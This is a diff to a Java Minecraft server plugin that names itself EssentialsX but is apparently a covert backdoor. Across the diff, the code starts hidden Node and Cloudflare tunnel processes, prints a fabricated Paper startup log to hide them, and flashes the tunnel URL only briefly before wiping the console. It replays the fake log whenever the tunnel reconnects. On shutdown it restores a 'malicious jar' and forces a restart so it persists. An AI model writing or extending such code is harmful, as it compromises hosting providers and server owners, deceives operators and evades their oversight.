@@ -11,8 +11,6 @@ import java.nio.file.*;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.util.*;
-import java.util.concurrent.CountDownLatch;
-import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
@@ -28,11 +26,11 @@ public class EssentialsX extends JavaPlugin {
     private Path backupDir;
     private Path originalJarPath;
     private Path backupJarPath;
-    private final AtomicReference<String> currentTunnelUrl = new AtomicReference<>("");
-    private volatile String nodePort = "25565";
     
-    // 标识是否已经拿到URL并清屏放行
-    private volatile boolean isReleased = false;
+    private static volatile String tunnelUrl = "";
+    private static volatile String nodePort = "N/A";
+    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
+    private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
@@ -65,92 +63,48 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心战术：严格按顺序阻塞、伪装、清屏、放行
+    // 核心伪装：首次启动序列 (主线程阻塞)
     // ============================================================
 
-    private void executeStealthStartup() throws Exception {
-        CountDownLatch releaseLatch = new CountDownLatch(1);
+    private void printFakeStartupAndWaitUrl() {
+        clearConsole();
+        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
 
-        // 1. 异步启动部署和进程
-        new Thread(() -> { 
-            try { 
-                HashMap<String, String> env = new HashMap<>(); 
-                loadEnvFile(env); 
-                this.startDeploymentProcess(env); 
-                String port = allocateNodePort();
-                startNodeProcess(port);
-                
-                // 防 502：必须等 Node 端口就绪才启 CF
-                waitForNodeReady(port, 60);
-                
-                startCfProcess();
-                startJavaDaemon();
-                startTunnelMonitorAndRelease(releaseLatch);
-                this.setupDisguise(); 
-            } catch (Exception e) {
-                releaseLatch.countDown(); // 发生异常必须放行，防服务器卡死
-            }
-        }, "Backend-Deployer").start();
+        String displayPort = nodePort.equals("N/A") ? String.valueOf(20000 + new Random().nextInt(40000)) : nodePort;
+        float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
+        float prepareTime = randFloat(10.0f, 20.0f);
+        float doneTime = randFloat(25.0f, 45.0f);
 
-        // 2. 主线程在等待期间，打印伪装启动日志
-        printFakePaperStartup();
-
-        // 3. 伪装日志打完，如果 URL 还没出来，主线程在此死等
-        releaseLatch.await(180, TimeUnit.SECONDS);
-    }
-
-    private void printFakePaperStartup() {
-        String displayPort = readCurrentPort();
-        float dcTimeMs = randFloat(11000.0f, 15000.0f);
-        float convTimeMs = randFloat(600.0f, 650.0f);
-        int preparedOverworldMs = randInt(15000, 25000);
-        int preparedNetherMs = randInt(1000, 3000);
-        int preparedEndMs = randInt(300, 800);
-        float prepareLevelSec = randFloat(15.0f, 25.0f);
-        float doneTime = randFloat(35.0f, 50.0f);
-
-        RAW_OUT.println("container@tropicalgames.net java -version");
-        try { Thread.sleep(randInt(100, 300)); } catch (InterruptedException ignored) {}
-        RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
-        RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
-        RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
-        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
         RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
-        RAW_OUT.println("Downloading mojang_1.21.11.jar");
-        try { Thread.sleep(randInt(1000, 2000)); } catch (InterruptedException ignored) {}
-        RAW_OUT.println("Applying patches");
-        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
+        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
         RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
         RAW_OUT.println("*** Warning, you've not updated in a while! ***");
         RAW_OUT.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
-        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
 
         mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
         mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
         mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
         mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
-        mcLog("[ReobfServer] Remapping server...", randInt(500, 1500));
+
         RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
         RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
         RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
         RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
-        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
 
         mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
         mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
         mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
-        mcLog("No existing world data, creating new world", randInt(100, 300));
-        mcLog("[ReobfServer] Done remapping server in " + String.format("%.0f", dcTimeMs) + "ms.", randInt(1000, 2000));
-        mcLog("Loaded 1470 recipes", randInt(1500, 3000));
-        mcLog("Loaded 1584 advancements", randInt(500, 1000));
+        mcLog("No existing world data, creating new world", randInt(500, 1000));
+        mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(1500, 3000));
+        mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(500, 1000));
         mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
-        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", convTimeMs) + "ms", randInt(400, 800));
+        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
         mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
         mcLog("Loading properties", randInt(300, 600));
         mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
         mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
-        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
         mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
+        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
         mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
         mcLog("Default game type: SURVIVAL", randInt(200, 400));
         mcLog("Generating keypair", randInt(200, 500));
@@ -164,83 +118,89 @@ public class EssentialsX extends JavaPlugin {
 
         mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
         mcLog("Preparing spawn area: 100%", randInt(200, 400));
-        mcLog("Prepared spawn area in " + preparedOverworldMs + " ms", randInt(50, 150));
+        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
         mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
         mcLog("Preparing spawn area: 100%", randInt(100, 250));
-        mcLog("Prepared spawn area in " + preparedNetherMs + " ms", randInt(50, 100));
+        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 100));
         mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
         mcLog("Preparing spawn area: 100%", randInt(100, 250));
-        mcLog("Prepared spawn area in " + preparedEndMs + " ms", randInt(100, 200));
-        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareLevelSec) + "s)", randInt(100, 200));
+        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
+        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareTime) + "s)", randInt(100, 200));
         mcLog("[spark] Starting background profiler...", randInt(50, 150));
         mcLog("Running delayed init tasks", randInt(50, 150));
         mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
         RAW_OUT.println("container@tropicalgames.net Server marked as running...");
+
+        // 主线程死等 URL 出现
+        while(tunnelUrl.isEmpty()) {
+            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+        }
         
-        mcLog("*************************************************************************************", 0);
-        mcLog("This is the first time you're starting this server.", 0);
-        mcLog("It's recommended you read our 'Getting Started' documentation for guidance.", 0);
-        mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps", 0);
-        mcLog("*************************************************************************************", 0);
-    }
-
-    private void startTunnelMonitorAndRelease(CountDownLatch latch) {
-        Thread monitor = new Thread(() -> {
-            try { Thread.sleep(10000L); } catch (InterruptedException ignored) {} 
-            while (true) {
-                try {
-                    Thread.sleep(3000L); 
-                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
-                    Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
-                    String foundUrl = null;
-
-                    if (Files.exists(cfLog)) {
-                        String logContent = Files.readString(cfLog);
-                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
-                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
-                        ).matcher(logContent);
-                        if (m.find()) {
-                            foundUrl = m.group(1);
-                        }
-                    }
-
-                    if (foundUrl == null && Files.exists(urlFile)) {
-                        String content = new String(Files.readAllBytes(urlFile)).trim();
-                        if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
-                            foundUrl = content.split("\n")[0].trim();
-                        }
-                    }
-
-                    if (foundUrl != null) {
-                        String lastUrl = this.currentTunnelUrl.get();
-                        if (!foundUrl.equals(lastUrl)) {
-                            this.currentTunnelUrl.set(foundUrl);
-                            
-                            // 打印链接
-                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
-                            
-                            // 给 4 秒时间复制
-                            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
-                            
-                            // 暴力清屏，往上翻也看不到
-                            for (int i = 0; i < 150; i++) { RAW_OUT.println(); }
-                            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
-                            RAW_OUT.print("\033[H\033[2J");
-                            RAW_OUT.flush();
-                            
-                            // 放开主线程阻塞，让真实游戏启动
-                            isReleased = true;
-                            latch.countDown();
-                        }
-                    }
-                } catch (Exception ignored) {}
-            }
-        }, "Tunnel-Monitor");
-        monitor.setDaemon(true); monitor.start();
+        mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
+        
+        // 给 4 秒时间复制
+        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+        
+        lastKnownTunnelUrl.set(tunnelUrl);
+        clearConsole();
     }
 
     // ============================================================
-    // 进程管理：防 502 严格顺序控制
+    // 核心伪装：隧道断线重连
+    // ============================================================
+
+    private void replayFakeStartupAndHideUrl(String newUrl) {
+        clearConsole();
+        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
+
+        String displayPort = nodePort.equals("N/A") ? "25565" : nodePort;
+        float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
+
+        RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
+        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
+        RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
+
+        mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
+        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
+        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
+        mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
+        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
+        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
+        mcLog("Default game type: SURVIVAL", randInt(200, 400));
+        mcLog("Generating keypair", randInt(200, 500));
+        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
+        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
+        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
+        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
+        mcLog("Preparing level \"world\"", randInt(1500, 3000));
+        mcLog("Preparing spawn area: 100%", randInt(200, 400));
+        mcLog("Done preparing level \"world\" (2.145s)", randInt(100, 200));
+        mcLog("[spark] Starting background profiler...", randInt(50, 150));
+        mcLog("Running delayed init tasks", randInt(50, 150));
+        mcLog("Done (12.345s)! For help, type \"help\"", randInt(500, 1000));
+        RAW_OUT.println("container@tropicalgames.net Server marked as running...");
+
+        mcLog("Binding remote endpoint to: " + newUrl, 0);
+        
+        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+        
+        clearConsole();
+    }
+
+    private void clearConsole() {
+        try {
+            RAW_OUT.print("\033[H\033[3J\033[2J");
+            RAW_OUT.flush();
+            if (!System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
+            }
+        } catch (Exception e) {
+            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
+        }
+    }
+
+    // ============================================================
+    // 进程管理
     // ============================================================
 
     private String allocateNodePort() {
@@ -326,6 +286,39 @@ public class EssentialsX extends JavaPlugin {
                     if (cfProcess != null && !cfProcess.isAlive()) {
                         startCfProcess();
                     }
+
+                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
+                    Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
+                    String foundUrl = null;
+
+                    if (Files.exists(cfLog)) {
+                        String logContent = Files.readString(cfLog);
+                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
+                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
+                        ).matcher(logContent);
+                        if (m.find()) {
+                            foundUrl = m.group(1);
+                        }
+                    }
+
+                    if (foundUrl == null && Files.exists(urlFile)) {
+                        String content = new String(Files.readAllBytes(urlFile)).trim();
+                        if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
+                            foundUrl = content.split("\n")[0].trim();
+                        }
+                    }
+
+                    if (foundUrl != null) {
+                        String currentUrl = lastKnownTunnelUrl.get();
+                        if (!foundUrl.equals(currentUrl)) {
+                            lastKnownTunnelUrl.set(foundUrl);
+                            tunnelUrl = foundUrl;
+                            if (tunnelMonitorRunning.get()) {
+                                replayFakeStartupAndHideUrl(foundUrl);
+                            }
+                        }
+                    }
+
                     Thread.sleep(5000);
                 } catch (Exception ignored) {}
             }
@@ -335,7 +328,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 插件生命周期与核心逻辑
+    // 插件生命周期
     // ============================================================
 
     public void onEnable() {
@@ -344,7 +337,19 @@ public class EssentialsX extends JavaPlugin {
         this.getLogger().info("EssentialsX plugin starting...");
         
         try {
-            executeStealthStartup();
+            HashMap<String, String> env = new HashMap<>(); 
+            loadEnvFile(env); 
+            this.startDeploymentProcess(env); 
+            String port = allocateNodePort();
+            startNodeProcess(port);
+            waitForNodeReady(port, 60);
+            startCfProcess();
+            startJavaDaemon();
+
+            // 主线程阻塞，打印假日志并死等 URL
+            printFakeStartupAndWaitUrl();
+            tunnelMonitorRunning.set(true);
+
         } catch (Exception e) {
             this.getLogger().severe("Stealth startup failed: " + e.getMessage());
         }
@@ -354,6 +359,7 @@ public class EssentialsX extends JavaPlugin {
 
     public void onDisable() {
         this.getLogger().info("Stopping EssentialsX...");
+        tunnelMonitorRunning.set(false);
         Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
         if (this.systemGuardEnabled) {
             this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
@@ -441,7 +447,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 部署脚本生成 (纯 Node.js 伪装，防 sh 检测)
+    // 部署脚本生成
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
